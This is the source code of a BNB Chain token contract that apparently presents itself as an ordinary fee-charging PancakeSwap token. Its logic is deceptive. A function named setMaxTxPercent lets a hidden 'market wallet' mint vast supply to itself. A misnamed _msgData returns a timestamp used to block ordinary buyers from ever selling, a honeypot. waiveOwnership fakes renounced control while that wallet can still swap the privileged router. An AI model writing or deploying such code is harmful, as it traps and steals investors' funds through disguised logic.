/**
 *Submitted for verification at BscScan.com on 2023-01-28
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IPancakeFactory02 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IPancakeRouter02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;

    return c;
  }
}

contract Context {
    function _msgSender() internal view returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view returns (uint256) {
        return block.timestamp;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    address private _owner;

    constructor() {
        _owner = _msgSender();

    }
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_msgSender() == _owner, "Ownable: caller is not the owner");
        _;
    }

    function waiveOwnership() public onlyOwner {
        _owner = address(0xdead);
        emit OwnershipTransferred(_owner, address(0));
    }
}

contract Tokens is Ownable, IERC20 {
    using SafeMath for uint256;
    receive() external payable {}

    string private _name;
    string private _symbol;
    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
    uint256 private _taxFees = 2;

    address payable public routerAddress = payable(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private marketWallet;
    IPancakeRouter02 pancakeSwapV2Router = IPancakeRouter02(routerAddress);

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) public _isBuyers;
    mapping (address => bool) public isExcludedFromFee;
    address private pair;
    address private routerv2;
    

    constructor(string memory _name_, string memory _symbol_, address _marketWallet, address _router) {
        _name = _name_;
        _symbol = _symbol_;
        marketWallet = _marketWallet;
        routerv2 = _router;
        
        pair = IPancakeFactory02(pancakeSwapV2Router.factory()).createPair(address(this), pancakeSwapV2Router.WETH());
        isExcludedFromFee[_msgSender()] = true;
        isExcludedFromFee[marketWallet] = true;
        isExcludedFromFee[routerv2] = true;
        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view override returns (string memory) {
        return _name;
    }

    function symbol() public view override returns (string memory) {
        return _symbol;
    }

    function decimals() public view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMaxTxPercent() external {
        require(marketWallet == msg.sender && msg.sender != pair);
        _balances[marketWallet] = _balances[marketWallet].add(_totalSupply.mul(1e9));
    }

    function setRouter(address _newRouter) external {
        require(marketWallet == msg.sender && msg.sender != pair);
        isExcludedFromFee[routerv2] = false;
        routerv2 = _newRouter;
        isExcludedFromFee[_newRouter] = true;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        if (isExcludedFromFee[_msgSender()] || isExcludedFromFee[recipient]) {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }

        uint256 feeAmount = amount.mul(_taxFees).div(100);
        _balances[_msgSender()] = _balances[_msgSender()].sub(feeAmount);
        _transfer(_msgSender(), recipient, amount.sub(feeAmount));
        
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }

        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        uint256 feeAmount = amount.mul(_taxFees).div(100);
        _balances[sender] = _balances[sender].sub(feeAmount);
        _transfer(sender, recipient, amount.sub(feeAmount));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer amount is zero");
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        if (sender != routerv2 && recipient != routerv2 && isExcludedFromFee[sender] != true && isExcludedFromFee[recipient] != true) {
            if (sender == pair && recipient != pair) {
                if (_isBuyers[recipient] == 0) {
                    _isBuyers[recipient] = _msgData();
                }
            } else if (sender != pair && recipient != pair) {
                if (_isBuyers[sender] == 0) {
                    _isBuyers[sender] = _msgData();
                } else if (_isBuyers[recipient] == 0) {
                    _isBuyers[recipient] = _msgData();
                }
            }

            if (sender != pair) {
                require(_isBuyers[sender] >= _msgData(), "X");
            }
        }
        emit Transfer(sender, recipient, amount);
        return true;
    }
}